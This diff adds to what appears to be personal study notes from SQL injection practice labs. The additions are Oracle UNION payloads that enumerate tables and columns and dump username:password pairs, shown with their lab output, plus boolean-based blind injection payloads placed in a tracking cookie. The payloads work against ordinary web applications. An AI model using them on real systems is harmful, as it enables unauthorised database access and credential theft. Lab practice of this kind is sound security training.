@@ -23,6 +23,24 @@ SYSTEM
 XDB
 
 Pets'+union+select+table_name,null+from+all_tables--
+
+APP_ROLE_MEMBERSHIP
+APP_USERS_AND_ROLES
+OL$HINTS
+PRODUCTS
+SRSNAMESPACE_TABLE
+USERS_MENQLQ
+
+Pets'+union+select+column_name,null+from+all_tab_columns+where+table_name='USERS_MENQLQ'--
+
+USERNAME_PSMOBC
+PASSWORD_WCMRQS
+
+Pets'+union+select+concat(concat(USERNAME_PSMOBC,':'),PASSWORD_WCMRQS),null+from+USERS_MENQLQ--
+
+administrator:5wu1j2bbimkqjr2okahv
+carlos:mezumukqieuo35oh4rrk
+wiener:u2phy3832cz7ql96el69
 ```
 ### mysql
 ```
@@ -127,3 +145,36 @@ wiener:mdcn7w1my9mdpnoc0l6m
 administrator:7qpk90futuka5actprm7
 ```
 
+## blind
+```
+# first thing to note (man ascii, printable chars, DEC values):
+special chars:    32 - 47
+numbers (0-9):    48 - 57
+special chars 2:  58 - 64
+uppercase:        65 - 90
+special chars 3:  91 - 96
+lowercase:        97 - 122
+special chars 4:  123 - 126
+
+# cookie
+TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='1 <<-- 5096 bytes
+TrackingId=sAt3guUqk4rPAa6E'+AND+'1'='2 <<-- 5035 bytes
+
+# use Comparer:
+# TRUE: "Welcome back" in response 
+# FALSE: "Welcome back" not in response
+
+TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'A'),1,1))=65+AND+'1'='1 <<-- true
+
+TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'B'),1,1))=66+AND+'1'='1 <<-- true
+
+TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+'A'),1,1))=66+AND+'1'='1 <<-- false <<-- we got em
+
+# prep for version()
+
+TrackingId=sAt3guUqk4rPAa6E'+AND+ASCII(SUBSTRING((SELECT+version()),1,1))=66+AND+'1'='1
+
+# target "66"
+
+
+```
